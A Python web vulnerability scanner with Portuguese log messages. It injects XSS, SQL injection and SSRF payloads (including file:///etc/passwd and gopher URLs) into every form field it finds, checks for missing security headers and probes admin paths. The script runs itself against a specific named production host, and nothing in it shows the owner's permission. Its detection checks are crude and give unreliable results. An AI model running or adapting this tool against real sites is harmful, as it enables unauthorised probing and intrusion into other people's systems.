import requests
import re
import time
import urllib.parse
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class WebScanner:
    def __init__(self, url):
        self.url = url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*",
            "Connection": "close"
        })
        
    def scan(self):
        print(f"Iniciando escaneamento em {self.url}")
        self.test_xss()
        self.test_sqli()
        self.test_ssrf()
        self.check_headers()
        self.enumerate_endpoints()
        
    def test_xss(self):
        payloads = [
            "<script>alert('XSS')</script>",
            "'\"'><svg/onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        # Obter todos os campos de input do site
        response = self.session.get(self.url)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>', response.text)
        
        for field in set(inputs):
            for payload in payloads:
                try:
                    data = {field: payload}
                    response = self.session.post(f"{self.url}", data=data)
                    if payload.replace("<", "").replace(">", "") in response.text:
                        logger.warning(f"[!] XSS encontrado no campo {field}: {payload}")
                except Exception as e:
                    logger.error(f"Erro em XSS: {e}")
                    
    def test_sqli(self):
        payloads = ["'", "1' OR '1'='1", "1' UNION SELECT NULL,NULL,NULL --"]
        
        response = self.session.get(self.url)
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>', response.text, re.DOTALL)
        
        for form in forms:
            action = form[0]
            form_data = re.findall(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*value=["\']([^"\']*)["\'][^>]*>', form[1])
            
            for field, value in form_data:
                for payload in payloads:
                    try:
                        data = {field: payload}
                        full_url = f"{self.url}/{action}" if action else self.url
                        response = self.session.post(full_url, data=data)
                        if any(word in response.text.lower() for word in ["syntax", "error", "sql"]):
                            logger.warning(f"[!] Possível SQL injection em {field}: {payload}")
                    except Exception as e:
                        logger.error(f"Erro em SQLi: {e}")
                    
    def test_ssrf(self):
        payloads = ["http://localhost", "file:///etc/passwd", "gopher://localhost:80/GET%20/"]
        
        response = self.session.get(self.url)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>', response.text)
        
        for field in set(inputs):
            for payload in payloads:
                try:
                    data = {field: payload}
                    response = self.session.post(f"{self.url}", data=data)
                    if payload in response.text:
                        logger.warning(f"[!] SSRF possível no campo {field}: {payload}")
                except Exception as e:
                    logger.error(f"Erro em SSRF: {e}")
                    
    def check_headers(self):
        response = self.session.get(self.url)
        required = ["Content-Security-Policy", "X-Content-Type-Options", 
                   "X-Frame-Options", "Strict-Transport-Security"]
        
        for header in required:
            if header not in response.headers:
                logger.warning(f"[-] Header de segurança faltando: {header}")
                
    def enumerate_endpoints(self):
        common_paths = ["/admin", "/login", "/api", "/dashboard", "/users", "/profile"]
        
        for path in common_paths:
            try:
                response = self.session.get(f"{self.url}{path}")
                if response.status_code < 400:
                    logger.info(f"[+] Endpoint encontrado: {path} (Status: {response.status_code})")
            except Exception as e:
                logger.error(f"Erro enumerando endpoints: {e}")

# Executar escaneamento
scanner = WebScanner("https://scorpions-crm-production.up.railway.app/")
scanner.scan()